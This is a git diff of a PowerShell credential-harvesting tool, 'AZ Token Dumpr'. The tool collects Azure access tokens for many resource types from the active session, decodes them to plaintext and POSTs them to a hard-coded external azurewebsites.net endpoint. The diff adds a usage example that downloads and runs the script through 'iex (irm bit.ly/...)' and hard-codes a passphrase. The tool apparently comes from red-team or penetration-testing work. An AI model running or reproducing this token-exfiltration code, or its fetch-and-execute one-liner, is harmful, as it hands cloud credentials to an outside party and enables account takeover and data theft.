@@ -1,32 +1,30 @@
 <#
 .SYNOPSIS
-Generates access tokens for various Azure resources and shares them via One-Time Secret.
+Retrieves access tokens for various Azure resources and sends them to a specified endpoint.
 
 .DESCRIPTION
-The AccessToken function retrieves access tokens for a predefined set of Azure resource types.
-It then shares these tokens securely using the One-Time Secret service. The function accepts
-optional parameters for the recipient email and passphrase used for the One-Time Secret.
+The AccessToken function retrieves access tokens for a predefined set of Azure resource types. 
+It requires the Az.Accounts module and an active Azure session. The function collects the tokens 
+and sends them to a specified endpoint via an HTTP POST request.
 
-.PARAMETER receiptEmail
-The email address of the recipient who will receive the One-Time Secret link.
-Defaults to "r.dijkman@securehats.nl".
-
-.PARAMETER passphrase
-The passphrase used to secure the One-Time Secret. Defaults to "Bl74ckC@t".
+.PARAMETER None
+This function does not take any parameters.
 
 .EXAMPLE
-PS> AccessToken -receiptEmail "example@example.com" -passphrase "MyPassphrase123"
-Generates access tokens and shares them via One-Time Secret with the specified email and passphrase.
+PS> iex (irm bit.ly/blct-fetch)
+This example downloads and runs the AccessToken function, retrieves access tokens for the specified Azure resources, 
+and sends them to the configured endpoint.
 
 .NOTES
-- Requires the Az PowerShell module.
-- Ensure you have the necessary permissions to retrieve access tokens for the specified Azure resources.
-- The One-Time Secret link is valid for 1 hour (3600 seconds).
+- Ensure the Az.Accounts module is installed and you are signed in to your Azure account using Connect-AzAccount.
+- The function uses parallel processing to retrieve tokens for multiple resource types concurrently.
+- The tokens are sent to an endpoint specified in the function.
 
 #>
 function AccessToken {
+    [cmdletbinding()]
     param (
-        $version = '1.2.1'
+        [string]$passphrase = "AzTokenDumpr"
     )
 
     if (-not(Get-Module -Name 'Az.Accounts')) {
@@ -47,7 +45,7 @@ function AccessToken {
     try {
         $tokens = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()
 
-$logo = @"
+        $logo = @"
   ______      __              ____
  /_  __/___  / /_____  ____  / __ \__  ______ __  ____  _____
   / / / __ \/ //_/ _ \/ __ \/ / / / / / / __ `__ \/ __ \/ ___/
@@ -55,46 +53,44 @@ $logo = @"
 /_/  \____/_/|_|\___/_/ /_/_____/\__,_/_/ /_/ /_/ .___/_/
                                                /_/
 
-             --- AZ Token Dumpr v$version ---
+             --- AZ Token Dumpr v1.2.3 ---
 "@
 
         Write-Host $logo
 
         $resourceTypeNames | ForEach-Object -Parallel {
-            param ($resourceTypeName, $tokens)
-
+            $tokens = $using:tokens
             try {
-                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString -ErrorAction SilentlyContinue)
-
+                $accessToken = (Get-AzAccessToken -ResourceTypeName $_ -AsSecureString -ErrorAction SilentlyContinue)
                 if ($accessToken) {
                     $tokenObject = [PSCustomObject]@{
-                        Resource = $resourceTypeName
+                        Resource = $_
                         Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
                     }
                     $tokens.Add($tokenObject)
                 }
             }
             catch {
-                Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
+                Write-Error "Failed to get access token for resource type $_ : $($_.Exception.Message)"
             }
-        } -ArgumentList $_, $tokens
+        }
 
         $requestParam = @{
-            Uri    = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?'
-            Method = 'POST'
+            Uri         = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?'
+            Method      = 'POST'
             ContentType = 'application/json'
-            Body   = @{
+            Body        = @{
                 action       = "create"
                 secret_value = $tokens | ConvertTo-Json -Depth 10
+                passphrase   = $passphrase
             } | ConvertTo-Json -Depth 10
         }
 
         $response = Invoke-RestMethod @requestParam
-        return $response
-        # @{
-        #     secret_key = $response.secret_key
-        #     url        = "bit.ly/blct-fetch"
-        # }
+        return @{
+            secretName = $response.secretName
+            url        = "bit.ly/blct-fetch"
+        }
     }
     catch {
         Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
